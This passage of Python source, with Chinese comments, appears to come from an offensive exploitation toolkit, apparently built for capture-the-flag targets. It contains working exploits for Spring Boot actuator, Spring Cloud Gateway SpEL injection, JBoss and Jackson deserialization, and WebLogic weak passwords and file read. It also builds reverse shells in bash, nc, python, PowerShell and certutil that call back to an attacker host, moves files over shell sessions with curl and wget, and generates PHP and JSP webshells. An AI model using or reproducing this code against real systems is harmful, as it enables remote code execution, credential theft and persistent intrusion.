      {"propertySources":[{"name":…,"properties":{"GZCTF_FLAG":{"value":"flag{…}","origin":…}}}]}
    值被 {"value":…} 包了一层，必须剥壳，否则一条都匹配不到（老版本正则就是死在这）。
    """
    base = normalize(target)
    to = int(p.get("timeout", 10))
    hdr = {"Accept": "application/json"}
    tried = []
    resp = None
    used = ""
    # Boot 2.x 走 /actuator/env，Boot 1.x 走 /env，哪个 200 用哪个
    for ep in ("/actuator/env", "/env"):
        rr = http(base + ep, headers=hdr, timeout=to)
        tried.append("%-14s → status=%s %d bytes" % (ep, rr["status"], len(rr["body"] or "")))
        if rr["status"] == 200 and (rr["body"] or "").strip():
            resp, used = rr, ep
            break
        if resp is None:
            resp = rr
    body = (resp["body"] or "") if resp else ""
    status = resp["status"] if resp else 0

    props = []
    ok_json = False
    try:
        j = json.loads(body)
        srcs = j.get("propertySources") if isinstance(j, dict) else None
        if isinstance(srcs, list):
            for ps in srcs:
                if not isinstance(ps, dict):
                    continue
                pp = ps.get("properties")
                if isinstance(pp, dict):
                    _env_flatten(pp, "", props)
                elif isinstance(pp, list):
                    for it in pp:
                        if isinstance(it, dict) and "name" in it:
                            props.append((str(it.get("name")), it.get("value")))
        else:
            _env_flatten(j if isinstance(j, dict) else {}, "", props)
        ok_json = bool(props) or isinstance(j, dict)
    except Exception:
        props = []

    if not ok_json:
        # JSON 解析失败 → 退回老正则（兼容自定义/被改写的 env 端点）
        pairs = re.findall(r'"(password|passwd|secret|token|key|ak|sk|accessKey|secretKey|url|jdbc[^"]*)"'
                           r'\s*:\s*"([^"]{2,120})"', body, re.I)
        sens = ["%s = %s" % (a, b) for a, b in pairs[:80]]
        stars = re.findall(r'"([a-zA-Z0-9_.\-]*(?:password|secret|token|key)[a-zA-Z0-9_.\-]*)"'
                           r'\s*:\s*"(\*+)"', body, re.I)
        flags = ["(正文) %s" % m.group(0)
                 for m in _ENV_FLAG_RE.finditer(body[:400000])]
        flags = list(dict.fromkeys(flags))[:50]
        # ★ 不能用 status==200 判成功：登录页 / 网关 HTML 同样会返回 200，
        #   那样 UI 上会显示绿色成功，但用户其实什么都没读到。必须真的提取到东西。
        ok = bool(sens) or bool(flags)
        if flags:
            output = "★ 正则兜底读到 %d 处 flag 字样；敏感项 %d 条" % (len(flags), len(sens))
        elif sens:
            output = "正则兜底提取到 %d 条敏感项" % len(sens)
        else:
            output = "未提取到明文（可能已脱敏或端点无内容）"
        return {"ok": ok, "flags": flags,
                "output": output,
                "detail": "端点: %s status=%s（JSON 解析失败，已退回正则）\n%s\n\n"
                          "FLAG 命中:\n%s\n\n明文项:\n%s\n\n"
                          "脱敏项(需 heapdump/jolokia 还原):\n%s"
                          % (used or "-", status, "\n".join(tried),
                             "\n".join(flags) or "-", "\n".join(sens) or "-",
                             "\n".join("%s = %s" % (a, b) for a, b in stars[:50]) or "-")}

    # ① FLAG 优先高亮
    flags = []
    for k, v in props:
        for m in _ENV_FLAG_RE.finditer(_env_str(v, 2000)):
            flags.append("%s = %s" % (k, m.group(0)))
    if not flags:
        for m in _ENV_FLAG_RE.finditer(body[:400000]):
            flags.append("(正文) %s" % m.group(0))
    flags = list(dict.fromkeys(flags))[:50]

    # ② 关键字敏感项
    sens = []
    for k, v in props:
        if _ENV_KEY_RE.search(str(k)):
            sens.append("%s = %s" % (k, _env_str(v)))
    sens = list(dict.fromkeys(sens))[:150]

    # ③ 全部属性
    all_lines = ["%s = %s" % (k, _env_str(v)) for k, v in props[:200]]

    # shiro 密钥提示
    hints = [h for h in (_shiro_key_hint(k, v) for k, v in props) if h]

    head = ("端点: %s   status=%s   解析: JSON(已剥 {value:…} 外壳)   属性总数: %d\n%s"
            % (used or "-", status, len(props), "\n".join(tried)))
    detail = "\n\n".join(
        [head,
         "① FLAG 命中（%d）:\n%s" % (len(flags), "\n".join(flags) or "-"),
         "② 敏感项（%d，关键字 flag|secret|token|password|key|jdbc|url|shiro|…）:\n%s"
         % (len(sens), "\n".join(sens) or "-"),
         "③ 全部属性（共 %d 条，最多列 200 条）:\n%s"
         % (len(props), "\n".join(all_lines) or "-")]
        + (["④ Shiro 密钥提示:\n%s" % "\n".join(hints)] if hints else []))

    if flags:
        output = "★ 读到 %d 处 flag 字样；敏感项 %d 条（共解析 %d 条属性）" % (len(flags), len(sens), len(props))
    elif sens:
        output = "提取到 %d 条敏感项（共解析 %d 条属性）" % (len(sens), len(props))
    else:
        output = "未命中关键字（共解析 %d 条属性；可能已脱敏或端点无内容，status=%s）" % (len(props), status)
    return {"ok": status == 200 and bool(props), "flags": flags, "output": output, "detail": detail}


def ex_springboot_gateway(target, p):
    base = normalize(target)
    cmd = p.get("cmd", "whoami")
    rid = p.get("route", "deserkit")
    spel = ("#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray("
            "T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"%s\"})"
            ".getInputStream()))}" % cmd.replace('"', '\\"'))
    route = {"id": rid, "filters": [{"name": "AddResponseHeader",
                                     "args": {"name": "Result", "value": spel}}],
             "uri": "http://example.com", "order": 0}
    steps = []
    r1 = http(base + "/actuator/gateway/routes/%s" % rid, method="POST",
              data=json.dumps(route), timeout=int(p.get("timeout", 10)))
    steps.append("创建路由 → %s" % r1["status"])
    r2 = http(base + "/actuator/gateway/refresh", method="POST", data="", timeout=10)
    steps.append("刷新 → %s" % r2["status"])
    r3 = http(base + "/actuator/gateway/routes", timeout=10)
    m = re.search(r'"Result"\s*:\s*"([^"]+)"', r3["body"])
    out = m.group(1) if m else ""
    return {"ok": bool(out) or r1["status"] in (200, 201),
            "output": out or ("路由已创建但无回显：%s" % "，".join(steps)),
            "detail": "%s\n\nSpEL: %s\n\n响应片段:\n%s" % ("\n".join(steps), spel, r3["body"][:1500])}


def ex_jboss_exploit(target, p):
    base = normalize(target)
    cmd = p.get("cmd", "whoami")
    gadget = p.get("gadget", "CommonsCollections5")
    jar = p.get("jar", "")
    raw, err = yso_generate(gadget, cmd, jar)
    if raw is None:
        return {"ok": False, "output": "需要 ysoserial: %s" % err,
                "detail": "java -jar ysoserial.jar %s \"%s\" > payload.ser\n"
                          "curl -X POST --data-binary @payload.ser %s/invoker/readonly"
                          % (gadget, cmd, base)}
    r = http(base + "/invoker/readonly", method="POST", data=raw, raw=True,
             ctype="application/x-www-form-urlencoded", timeout=int(p.get("timeout", 15)))
    return {"ok": r["status"] in (200, 500),
            "output": "status=%s（500 即多半成功，反序列化已触发）" % r["status"],
            "detail": "POST %s/invoker/readonly  gadget=%s cmd=%s\n响应: %s"
                      % (base, gadget, cmd, r["body"][:500])}


def ex_jackson_send(target, p):
    base = normalize(target)
    host = p.get("lhost") or src_ip_for(target) or "127.0.0.1"
    port = p.get("ldap_port", STATE["jndi"]["ldap_port"])
    body = p.get("raw") or ('{"obj":{"@class":"com.sun.rowset.JdbcRowSetImpl",'
                            '"dataSourceName":"ldap://%s:%s/x","autoCommit":true}}' % (host, port))
    r = http(base + (p.get("path") or "/"), method="POST", data=body,
             timeout=int(p.get("timeout", 10)))
    return {"ok": True, "output": "status=%s" % r["status"],
            "detail": "%s\n\n%s" % (body, r["body"][:1500])}


def ex_weblogic_probe(target, p):
    base = normalize(target)
    eps = ["/console/", "/wls-wsat/CoordinatorPortType", "/wls-wsat/RegistrationPortTypeRPC",
           "/_async/AsyncResponseService", "/bea_wls_internal/",
           "/uddiexplorer/SearchPublicRegistries.jsp"]
    lines = []
    for e in eps:
        r = http(base + e, timeout=int(p.get("timeout", 8)))
        lines.append("%-46s %s" % (e, r["status"]))
    return {"ok": True, "output": "探测完成",
            "detail": "\n".join(lines) + "\n\n/wls-wsat 200 → CVE-2017-10271(XML→RCE)；"
                                         "/_async 200 → CVE-2019-2725；/console → 后台 weak口令"}


def _wl_hostport(target, default_port=7001):
    u = urllib.parse.urlparse(normalize(target))
    host = u.hostname or (target.split("//")[-1].split(":")[0])
    port = u.port or default_port
    return host, port


def ex_weblogic_t3(target, p):
    """T3 协议握手：能握手说明 T3 开着，就有反序列化面"""
    host, port = _wl_hostport(target, int(p.get("port", 7001)))
    try:
        s = socket.create_connection((host, port), timeout=int(p.get("timeout", 8)))
        s.sendall(b"t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n")
        s.settimeout(int(p.get("timeout", 8)))
        data = s.recv(2048)
        s.close()
    except Exception as e:
        return {"ok": False, "output": "连接失败: %s" % e, "detail": "目标 %s:%s" % (host, port)}
    txt = data.decode("latin-1", "ignore")
    hit = "HELO" in txt
    ver = re.search(r"HELO:([0-9.]+)", txt)
    return {"ok": hit,
            "output": ("T3 协议开启，版本 %s" % ver.group(1)) if hit else "未收到 HELO（T3 可能已禁用）",
            "detail": "握手 %s:%s\n原始响应:\n%s" % (host, port, txt[:600])}


def ex_weblogic_weak(target, p):
    base = normalize(target)
    users = [x.strip() for x in (p.get("users") or "system,weblogic,admin,wlcsystem,Weblogic").split(",") if x.strip()]
    pwds = [x.strip() for x in (p.get("pwds") or
            "Weblogic,weblogic,weblogic123,password,security,system,admin,Password,wlcsystem,Oracle@123").split(",") if x.strip()]
    hits, lines = [], []
    for u in users:
        for w in pwds:
            r = http(base + "/console/j_security_check", method="POST",
                     data="j_username=%s&j_password=%s" % (urllib.parse.quote(u), urllib.parse.quote(w)),
                     ctype="application/x-www-form-urlencoded",
                     timeout=int(p.get("timeout", 8)), allow_redirect=False)
            sc = r["headers"].get("set-cookie", "") + r["headers"].get("location", "")
            good = ("ADMINCONSOLESESSION" in sc) or ("console.portal" in sc)
            lines.append("%-10s / %-14s → %s %s" % (u, w, r["status"], "✔" if good else ""))
            if good:
                hits.append("%s:%s" % (u, w))
    return {"ok": bool(hits),
            "output": ("命中: " + "，".join(hits)) if hits else "未命中弱口令",
            "detail": "\n".join(lines)}


def ex_weblogic_fileread(target, p):
    base = normalize(target)
    path = p.get("path", "/etc/passwd")
    r = http(base + "/hello/file.jsp?path=" + urllib.parse.quote(path),
             timeout=int(p.get("timeout", 10)))
    return {"ok": r["status"] == 200 and len(r["body"]) > 0,
            "output": r["body"][:800] or ("status=%s %s" % (r["status"], r["err"])),
            "detail": "GET /hello/file.jsp?path=%s\nstatus=%s\n\n%s"
                      % (path, r["status"], r["body"][:2000])}


def ex_weblogic_payload(target, p):
    """生成 CVE-2018-2628 完整命令序列（有 jar 时直接出 JRMPClient2 hex）"""
    lhost = p.get("lhost") or src_ip_for(target) or "127.0.0.1"
    jrmp = p.get("jrmp", 22801)
    lport = p.get("lport", 9988)
    gadget = p.get("gadget", "Jdk7u21")
    jar = p.get("jar", "")
    rev = "bash -i >& /dev/tcp/%s/%s 0>&1" % (lhost, lport)
    # ${IFS} 版：整条无空格 → exec(String) 的 StringTokenizer 切出单个 argv，
    # bash 再把 ${IFS} 展开成空格。不用管道/引号/base64（那些在 exec 里都不生效）。
    final = "bash -c bash${IFS}-i${IFS}>&/dev/tcp/%s/%s${IFS}<&1" % (lhost, lport)
    hexp = ""
    if jar or find_ysoserial():
        raw, err = yso_generate("JRMPClient2", "%s:%s" % (lhost, jrmp), jar)
        if raw:
            hexp = raw.hex()
        else:
            hexp = "(生成失败: %s)" % err
    txt = (
        "# ① 起 JRMP 监听（JDK8）\n"
        "java -cp ysoserial-0.1-cve-2018-2628-all.jar ysoserial.exploit.JRMPListener %s %s \"%s\"\n\n"
        "# ② 生成 payload 填进 weblogic_poc.py 第 21 行\n"
        "java -jar ysoserial-0.1-cve-2018-2628-all.jar JRMPClient2 %s:%s | xxd -p | tr -d $'\\n'\n"
        "%s\n\n"
        "# ③ 监听反弹 shell\n"
        "nc -lvvp %s\n\n"
        "# ④ 用 python2 跑 poc（改第 84/85 行目标 IP 和端口）\n"
        "python2 weblogic_poc.py\n\n"
        "# 一键扫描可用：python ws.py -t <目标IP>   (weblogicScanner)"
    ) % (jrmp, gadget, final, lhost, jrmp, hexp or "(未放 ysoserial.jar，手工执行上面这行)", lport)
    txt = "真实反弹命令(人读): %s\n下发的无空格命令  : %s\n\n%s" % (rev, final, txt)
    return {"ok": True, "output": final, "detail": txt}


def ex_generic_shell(target, p):
    lhost = p.get("lhost") or src_ip_for(target) or "127.0.0.1"
    lport = p.get("lport", 4444)
    sh = p.get("style", "bash-tcp")
    c = p.get("cmd", "") or ""
    if sh == "bash-tcp":
        s = "bash -i >& /dev/tcp/%s/%s 0>&1" % (lhost, lport)
    elif sh in ("bash-ifs", "bash-b64"):
        # 无空格版（曾用名 bash-b64，保留兼容）：适合 Runtime.getRuntime().exec(String)，
        # 空格换 ${IFS} → tokenize 后是单个 argv，由 bash 自己还原。
        s = "bash -c bash${IFS}-i${IFS}>&/dev/tcp/%s/%s${IFS}<&1" % (lhost, lport)
    elif sh == "nc":
        s = "nc -e /bin/sh %s %s" % (lhost, lport)
    elif sh == "nc-mkfifo":
        s = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" % (lhost, lport)
    elif sh == "python":
        s = ("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"%s\",%s));"
             "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
             "subprocess.call([\"/bin/sh\",\"-i\"])'" % (lhost, lport))
    elif sh == "powershell":
        s = ("powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('%s',%s);"
             "$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
             "{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
             "$r=(iex $d 2>&1|Out-String);$t=$r+'PS>';"
             "$sb=([text.encoding]::ASCII).GetBytes($t);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\""
             % (lhost, lport))
    elif sh == "certutil":
        s = "certutil -urlcache -split -f http://%s:%s/nc.exe C:\\Windows\\Temp\\nc.exe && " \
            "C:\\Windows\\Temp\\nc.exe -e cmd.exe %s %s" % (
                lhost, STATE["jndi"]["http_port"] or 8000, lhost, lport)
    else:
        s = c
    b64 = base64.b64encode(s.encode()).decode()
    return {"ok": True, "output": s,
            "detail": "原命令:\n%s\n\nBase64(仅用于你自己回显/传输，不是给 exec 用的):\n%s\n\n"
                      "Java 反序列化（Runtime.getRuntime().exec(String)）怎么用:\n"
                      "  把命令里所有空格换成 ${IFS}（bash 会把它展开成空格），例如：\n"
                      "  bash -c bash${IFS}-i${IFS}>&/dev/tcp/%s/%s${IFS}<&1\n"
                      "  无空格 → StringTokenizer 只切出单个 argv，管道/引号全部不需要。\n"
                      "  ⚠ 结尾必须是 ${IFS}<&1：写成 ${IFS}0>&1 时实测（本机 bash 5.3）：TCP 会连上、监听侧能 accept，但 bash 随即退出、连接被 RST，发过去的命令没有任何回显，拿不到可用会话 —— 它并不是 ambiguous redirect（那个错误只在重定向目标本身含 ${IFS} 时才报，如 `>${IFS}a${IFS}b`）；正确写法 ${IFS}<&1 实测 3/3 连上且能发命令收回显。\n\n"
                      "提示: Runtime.exec 不经过 shell，管道/重定向/引号一律不生效" % (s, b64, lhost, lport)}


# ============================================================
# 新增：自动识别 / 反弹 shell 通道文件传输 / 一句话木马落地
# （半自动、默认安全：探测全自动跑；利用与拿 shell 必须显式 confirm）
# ============================================================
def _shell_run(sid, cmd, timeout=8.0, max_bytes=5_000_000, sep=";"):
    """经已建立的反弹 shell 会话（原始交互式 shell 管道）执行命令并读回输出。

    交互式 shell 会回显敲入的命令行、并在末尾带提示符，直接用 recv 读到的内容里
    混着命令回显。这里用一对唯一标记把「真正输出」框起来：
        echo __S_<随机>__ ; <cmd> ; echo __E_<随机>__
    取最后一个 __S__ 与最后一个 __E__ 之间的内容即为命令输出。
    sep: 命令分隔符，bash 用 ";"（默认），Windows cmd.exe 用 "&"。
    返回 (text, err)；err 非 None 表示失败。
    """
    with SESS_LOCK:
        s = STATE["sessions"].get(sid)
        if not s:
            return None, "会话不存在（先用 Shiro / XStream 的 shell 模式把目标打上线）"
        sock = s["sock"]
    m = os.urandom(8).hex()
    sm, em = "__S_" + m + "__", "__E_" + m + "__"
    try:
        sock.sendall(("echo %s%s %s%s echo %s\n" % (sm, sep, cmd, sep, em)).encode())
    except Exception as e:
        return None, "命令发送失败: %s" % e
    buf = b""
    t0 = time.time()
    done = False
    try:
        sock.settimeout(0.5)
        while time.time() - t0 < timeout:
            try:
                d = sock.recv(65535)
            except socket.timeout:
                if done:
                    break
                continue
            except Exception:
                break
            if not d:
                break
            buf += d
            if em.encode() in buf:
                done = True
                # 已看到结束标记后，再给一点余量把尾随数据读完
                if time.time() - t0 > timeout - 1.0:
                    break
            if len(buf) > max_bytes:
                break
    except Exception:
        pass
    text = buf.decode("utf-8", "ignore")
    si = text.rfind(sm)
    ei = text.rfind(em)
    if si >= 0 and ei > si:
        return text[si + len(sm):ei].strip(), None
    return text.strip(), None


def _temp_http_server(data, port_hint):
    """临时 HTTP 服务，用于「反弹 shell 通道文件传输」的加速通道：

    · GET  /f  → 返回 data（把文件推给目标，目标用 curl/wget 拉取）
    · POST /u  → 把请求体存到 server.recv（目标把文件 POST 回我们）

    端口用 bind_socket 选（含 Windows 预探顺延、SO_REUSEADDR 等既有逻辑），
    返回 (server, port, info)。server 用完调用 shutdown()+server_close() 即可。
    """
    class _H(httpsrv.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _emit(self, code, body):
            body = body if isinstance(body, bytes) else body.encode("utf-8", "ignore")
            self.send_response(code)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            if self.path.startswith("/f"):
                self._emit(200, data)
            else:
                self._emit(404, b"")

        def do_POST(self):
            if self.path.startswith("/u"):
                n = int(self.headers.get("Content-Length", "0") or 0)
                try:
                    self.server.recv = self.rfile.read(n) if n else b""
                except Exception:
                    self.server.recv = b""
                self._emit(200, b"ok")
            else:
                self._emit(404, b"")

    s, port, info = bind_socket(port_hint)
    if s is None:
        return None, None, info
    try:
        srv = socketserver.ThreadingTCPServer(("0.0.0.0", 0), _H, bind_and_activate=False)
    except Exception as e:
        try:
            s.close()
        except Exception:
            pass
        info["err"] = str(e)
        return None, None, info
    srv.socket = s          # 复用已 bind+listen 的 socket，避免重新绑定的竞态
    srv.recv = b""
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, port, info


def _upload_bytes(sid, data, remote, target, p, notes):
    """把内存里的字节经反弹 shell 通道写到目标 remote。

    机制「两者自动结合」：
      ① 先探测目标是否有 curl/wget；有则临时起 HTTP 服务让目标拉取（快、可靠）；
      ② 失败/无 helper 则回退 shell 通道 base64 分块（慢，受命令行长度限制，适合小文件）。
    返回结果 dict。
    """
    lhost = ((p.get("lhost") or "").strip() or src_ip_for(target)
             or (local_ips() or ["127.0.0.1"])[0])
    port = int(p.get("port") or 8000)
    to = float(p.get("timeout") or 30)
    # ① 探测 helpers
    helper_out, _ = _shell_run(sid, "command -v curl wget python3 python 2>/dev/null; echo DK_HELPERS_DONE", timeout=6)
    helpers = set()
    if helper_out:
        for h in ("curl", "wget", "python3", "python"):
            if (" " + h) in (" " + helper_out) or helper_out.strip().split():
                if h in helper_out:
                    helpers.add(h)
    if "curl" in helpers or "wget" in helpers:
        srv, sport, info = _temp_http_server(data, port)
        if srv is not None:
            try:
                if "curl" in helpers:
                    cl = "curl -s -o %s http://%s:%d/f" % (remote, lhost, sport)
                else:
                    cl = "wget -q -O %s http://%s:%d/f" % (remote, lhost, sport)
                _shell_run(sid, cl, timeout=to)
                sz, _ = _shell_run(sid, "wc -c < %s 2>/dev/null || echo 0" % remote, timeout=6)
                sz = (sz or "0").strip().split()[0] if sz else "0"
                notes.append("方式=HTTP(%s) 端口=%d 目标拉取命令: %s"
                             % ("curl" if "curl" in helpers else "wget", sport, cl))
                try:
                    szn = int(sz)
                except Exception:
                    szn = -1
                if szn == len(data):
                    return {"ok": True,
                            "output": "上传成功: %s (%d 字节，经 HTTP 拉取)" % (remote, len(data)),
                            "detail": "\n".join(notes)}
                notes.append("校验: 期望 %d 字节，目标实际 %s 字节 → HTTP 拉取可能失败，转 shell 通道回退"
                             % (len(data), sz))
            except Exception as ex:
                notes.append("HTTP 上传异常: %s" % ex)
            finally:
                try:
                    srv.shutdown()
                    srv.server_close()
                except Exception:
                    pass
    # Windows 目标（常见：既无 curl 也无 wget）→ 走 certutil / PowerShell，
    # 绝不下发 base64 -d 、/tmp/... 这类 Linux 命令（在 Windows 上必然失败）
    if _detect_shell_os(sid) == "windows":
        return _upload_bytes_windows(sid, data, remote, timeout=to)
    # ② 回退：shell 通道 base64 分块（每块约 1KB，避开命令行长度上限；适合小文件）
    b = base64.b64encode(data).decode()
    chunk = 1024
    tmp = "/tmp/.dk_up_%s.b64" % os.urandom(4).hex()
    n = 0
    while n < len(b):
        piece = b[n:n + chunk]
        # base64 字符集不含单引号 / shell 元字符，用单引号包住最稳
        c, e = _shell_run(sid, "printf '%%s' '%s' >> %s" % (piece, tmp), timeout=5)
        if e:
            return {"ok": False, "output": "分块写入中断: %s" % e, "detail": "\n".join(notes)}
        n += chunk
    _shell_run(sid, "base64 -d %s > %s; echo DK_RC=$?" % (tmp, remote), timeout=8)
    _shell_run(sid, "rm -f %s" % tmp, timeout=5)
    sz, _ = _shell_run(sid, "wc -c < %s 2>/dev/null || echo 0" % remote, timeout=6)
    sz = (sz or "0").strip().split()[0] if sz else "0"
    try:
        szn = int(sz)
    except Exception:
        szn = -1
    if szn == len(data):
        notes.append("方式=shell通道base64分块(%d 块，每块 %d 字节)"
                     % ((len(b) + chunk - 1) // chunk, chunk))
        return {"ok": True, "output": "上传成功: %s (%d 字节)" % (remote, len(data)),
                "detail": "\n".join(notes)}
    return {"ok": False,
            "output": "上传校验失败: 期望 %d 字节，实际 %s 字节（shell 通道回退不稳定，建议目标装 curl/wget）"
                      % (len(data), sz),
            "detail": "\n".join(notes)}


def ex_shell_upload(target, p):
    """经已建立的反弹 shell 通道上传文件（功能 B）。

    参数: sid(必填, 反弹会话ID), local(本地文件路径), remote(目标路径),
          lhost(可选, 攻击者IP, 默认按路由自动), port(可选, 临时HTTP端口, 默认8000),
          timeout(可选)。
    机制: 优先 curl/wget + 临时 HTTP 服务加速；失败回退 shell 通道 base64 分块。
    绝不主动开火利用，只是把文件写进目标（与已有 shell 同一通道）。
    """
    sid = (p.get("sid") or "").strip()
    local = (p.get("local") or "").strip()
    remote = (p.get("remote") or "").strip()
    if not sid:
        return {"ok": False, "output": "缺少 sid（先让目标通过 Shiro / XStream shell 模式上线）"}
    if not remote:
        return {"ok": False, "output": "请填写目标路径 remote"}
    data = p.get("_bytes")          # 内部用，绕过文件（webshell 落地复用）
    if data is None:
        if not local or not os.path.isfile(local):
            return {"ok": False, "output": "本地文件不存在: %s" % local}
        try:
            data = open(local, "rb").read()
        except Exception as e:
            return {"ok": False, "output": "读本地文件失败: %s" % e}
    return _upload_bytes(sid, data, remote, target, p, [])


def ex_shell_download(target, p):
    """经已建立的反弹 shell 通道下载文件（功能 B）。

    参数: sid(必填), remote(目标路径), local(可选, 本地保存路径; 留空则返回 content),
          lhost(可选), port(可选, 临时HTTP端口), timeout(可选)。
    机制: 优先 curl/wget POST 回推到临时 HTTP 服务；回退 shell 通道 base64 读回（≤2MB）。
    """
    sid = (p.get("sid") or "").strip()
    remote = (p.get("remote") or "").strip()
    local = (p.get("local") or "").strip()
    if not sid:
        return {"ok": False, "output": "缺少 sid（先让目标通过 Shiro / XStream shell 模式上线）"}
    if not STATE["sessions"].get(sid):
        return {"ok": False, "output": "会话不存在（先用 Shiro / XStream 的 shell 模式把目标打上线）"}
    if not remote:
        return {"ok": False, "output": "请填写目标路径 remote"}
    lhost = ((p.get("lhost") or "").strip() or src_ip_for(target)
             or (local_ips() or ["127.0.0.1"])[0])
    port = int(p.get("port") or 8000)
    to = float(p.get("timeout") or 30)
    notes = []
    # ① 探测 helpers
    helper_out, _ = _shell_run(sid, "command -v curl wget 2>/dev/null; echo DK_DONE", timeout=6)
    helpers = set()
    if helper_out:
        for h in ("curl", "wget"):
            if h in helper_out:
                helpers.add(h)
    if "curl" in helpers or "wget" in helpers:
        srv, sport, info = _temp_http_server(b"", port)
        if srv is not None:
            try:
                if "curl" in helpers:
                    cl = "curl -s -F f=@%s http://%s:%d/u" % (remote, lhost, sport)
                else:
                    cl = "wget -q --post-file=%s http://%s:%d/u" % (remote, lhost, sport)
                _shell_run(sid, cl, timeout=to)
                got = getattr(srv, "recv", b"") or b""
                notes.append("方式=HTTP回推 端口=%d" % sport)
                srv.shutdown()
                srv.server_close()
                if got:
                    if local:
                        try:
                            open(local, "wb").write(got)
                        except Exception as e:
                            return {"ok": False, "output": "写本地文件失败: %s" % e,
                                    "detail": "\n".join(notes)}
                        return {"ok": True,
                                "output": "下载成功: %s (%d 字节)" % (local, len(got)),
                                "detail": "\n".join(notes)}
                    return {"ok": True,
                            "output": "下载成功 %d 字节（见 content 字段）" % len(got),
                            "content": got.decode("utf-8", "ignore"),
                            "detail": "\n".join(notes)}
                notes.append("HTTP 回推未收到数据，转 shell 通道回退")
            except Exception as ex:
                notes.append("HTTP 下载异常: %s" % ex)
            finally:
                try:
                    srv.shutdown()
                    srv.server_close()
                except Exception:
                    pass
    # ② 回退：shell 通道 base64 整文件读回（上限 2MB，避免交互式管道过长不稳定）
    sz_s, _ = _shell_run(sid, "wc -c < %s 2>/dev/null || echo 0" % remote, timeout=6)
    sz_s = (sz_s or "0").strip().split()[0] if sz_s else "0"
    try:
        total = int(sz_s)
    except Exception:
        total = -1
    if total <= 0:
        return {"ok": False, "output": "目标文件不存在或不可读: %s" % remote,
                "detail": "\n".join(notes)}
    if total > 2_000_000:
        return {"ok": False,
                "output": "文件过大(%d 字节)，shell 通道回退仅支持 ≤2MB；请确认目标有 curl/wget 走 HTTP 通道"
                          % total,
                "detail": "\n".join(notes)}
    b64, e = _shell_run(sid, "base64 -w0 %s 2>/dev/null" % remote, timeout=max(to, 15))
    if e or not b64:
        return {"ok": False, "output": "分块读取失败: %s" % (e or "空响应"),
                "detail": "\n".join(notes)}
    try:
        data = base64.b64decode(b64.strip())
    except Exception as ex:
        return {"ok": False, "output": "base64 解码失败: %s" % ex, "detail": "\n".join(notes)}
    if local:
        try:
            open(local, "wb").write(data)
        except Exception as ex:
            return {"ok": False, "output": "写本地文件失败: %s" % ex, "detail": "\n".join(notes)}
        return {"ok": True, "output": "下载成功: %s (%d 字节)" % (local, len(data)),
                "detail": "\n".join(notes)}
    return {"ok": True, "output": "下载成功 %d 字节（见 content 字段）" % len(data),
            "content": data.decode("utf-8", "ignore"),
            "detail": "\n".join(notes)}


def _gen_webshell(lang, password, encoding, key=None):
    """生成一句话木马源码。lang=php/jsp/asp/aspx；encoding=base64/xor/plain。
    key = xor 密钥（留空则用默认 dkx0r，保持向后兼容）。
    仅生成文本，不落地、不执行。返回 (code_text, ext)。"""
    pw = password or "dk"
    encoding = (encoding or "plain").strip().lower()
    xk = (key or "").strip() or "dkx0r"      # 四处 xor 密钥统一从这里取，别再硬编码
    # 四种语言的字符串字面量转义规则各不相同，**绝不能混用一套**：
    #   PHP 单引号串：只认 \\ 和 \'（\" 不会被识别，反而是 \ + " 两个字符）
    #   Java / C# 双引号串：认 \\ 和 \"（\b \n \t 等还会被当成转义字符，必须先把 \ 翻倍）
    #   VBScript 双引号串：串内一个双引号要写成两个 ""
    esc_php = lambda s: (s or "").replace("\\", "\\\\").replace("'", "\\'")
    esc_java = lambda s: (s or "").replace("\\", "\\\\").replace('"', '\\"')
    esc_vbs = lambda s: (s or "").replace('"', '""')
    esc = esc_java                       # aspx / C# 沿用 Java 规则
    ext = {"php": ".php", "jsp": ".jsp", "asp": ".asp", "aspx": ".aspx"}.get(lang, ".php")
    if lang == "php":
        epw, ek = esc_php(pw), esc_php(xk)
        if encoding == "base64":
            code = "<?php if(isset($_POST['%s'])){@eval(base64_decode($_POST['%s']));}?>" % (epw, epw)
        elif encoding == "xor":
            code = ("<?php $k='%s'; if(isset($_POST['%s'])){$d=base64_decode($_POST['%s']);"
                    "$c='';for($i=0;$i<strlen($d);$i++){$c.=$d[$i]^$k[$i%%strlen($k)];}@eval($c);}?>"
                    % (ek, epw, epw))
        else:
            code = "<?php if(isset($_POST['%s'])){@eval($_POST['%s']);}?>" % (epw, epw)
    elif lang == "jsp":
        epw, ek = esc_java(pw), esc_java(xk)
        head = '<%@ page import="java.io.*,java.util.*" %>\n'
        if encoding == "base64":
            body = ("<%% String p=request.getParameter(\"%s\"); if(p!=null){byte[] cb="
                    "Base64.getDecoder().decode(p); String cmd=new String(cb);"
                    "Process pr=Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",cmd});"
                    "InputStream is=pr.getInputStream();byte[] b=new byte[8192];int n;"
                    "while((n=is.read(b))!=-1)out.write(new String(b,0,n));} %%>" % epw)
        elif encoding == "xor":
            body = ("<%% String p=request.getParameter(\"%s\"); if(p!=null){byte[] db="
                    "Base64.getDecoder().decode(p); String k=\"%s\";byte[] cb="
                    "new byte[db.length]; for(int i=0;i<db.length;i++){cb[i]=(byte)"
                    "(db[i]^(byte)k.charAt(i%%k.length()));} String cmd=new String(cb);"
                    "Process pr=Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",cmd});"
                    "InputStream is=pr.getInputStream();byte[] b=new byte[8192];int n;"
                    "while((n=is.read(b))!=-1)out.write(new String(b,0,n));} %%>" % (epw, ek))
        else:
            body = ("<%% String p=request.getParameter(\"%s\"); if(p!=null){"
                    "Process pr=Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",p});"
